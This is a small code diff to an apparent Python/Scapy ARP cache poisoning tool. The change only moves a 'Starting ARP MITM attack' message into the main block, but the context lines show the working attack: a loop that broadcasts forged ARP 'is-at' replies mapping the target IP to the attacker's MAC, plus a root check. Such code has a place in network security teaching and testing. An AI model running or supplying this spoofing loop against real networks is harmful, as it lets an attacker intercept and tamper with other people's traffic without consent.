@@ -15,7 +15,6 @@ def arp_mitm(interface, target, interval=10):
 	"""ARP cache poisoning attack"""
 
 	myMAC = get_if_hwaddr(interface)
-	print("[*] Starting ARP MITM attack ...")
 	while 1:
 		sendp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op="is-at", psrc=target, hwsrc=myMAC))
 		sleep(interval)
@@ -31,6 +30,7 @@ if __name__ == "__main__":
 		exit("[!] You must be root")
 
 	try:
+		print("[*] Starting ARP MITM attack ...")
 		arp_mitm(args["interface"], args["target"], args["interval"])
 	except IOError:
 		exit("[!] Interface doesn't exist")
